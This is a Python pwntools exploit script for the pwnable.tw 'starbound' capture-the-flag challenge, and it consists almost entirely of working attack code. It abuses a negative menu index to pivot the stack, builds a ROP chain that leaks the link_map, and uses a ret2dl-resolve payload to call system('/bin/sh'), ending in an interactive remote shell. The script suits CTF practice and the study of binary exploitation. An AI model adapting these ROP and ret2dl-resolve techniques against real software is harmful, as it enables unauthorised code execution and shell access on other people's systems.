from pwn import *
import roputils
import sys

context.arch = 'i386'
rop=roputils.ROP('./starbound')

host = 'chall.pwnable.tw'
port = 10202
if len(sys.argv) > 1:
    r = remote(host, port)
else:
    r = process('./starbound')

def back():
    r.sendlineafter('> ', '1')

def setting():
    r.sendlineafter('> ', '6')

def set_name(payload):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', payload)


add_esp = 0x8048e48
puts_plt = 0x8048b90
read_plt = 0x8048a70
pop_ebp = 0x804a6df
pop_3_times = 0x804a6dd
linkmap_got = 0x8055004
leave = 0x8048c58
data_section = 0x8055a00

setting()
set_name(p32(add_esp))


payload = '-33'.ljust(0x8, '\x00')
payload += p32(puts_plt) + p32(pop_ebp) + p32(linkmap_got)
payload += p32(read_plt) + p32(pop_3_times) + p32(0) + p32(data_section) + p32(0x300)
payload += p32(pop_ebp) + p32(data_section-4) + p32(leave)

r.sendlineafter('> ', payload)

linkmap = u32(r.recvuntil('\n').strip('\n').ljust(0x4, '\x00')) +0xe4
log.info('linkmap: '+ hex(linkmap))


# set vernum[ELFW(R_SYM) (reloc->r_info)] to NULL preventing idx too big problem
payload = p32(read_plt)+p32(pop_3_times)+p32(0)+p32(linkmap)+p32(0x4)
payload += rop.dl_resolve_call(data_section+0x100)+p32(data_section+0x200)
payload = payload.ljust(0x100, '\x00')
payload += rop.dl_resolve_data(data_section+0x100, 'system')
payload = payload.ljust(0x200, '\x00')
payload += '/bin/sh\x00'

r.sendline(payload)
r.send(p32(0))

r.interactive()
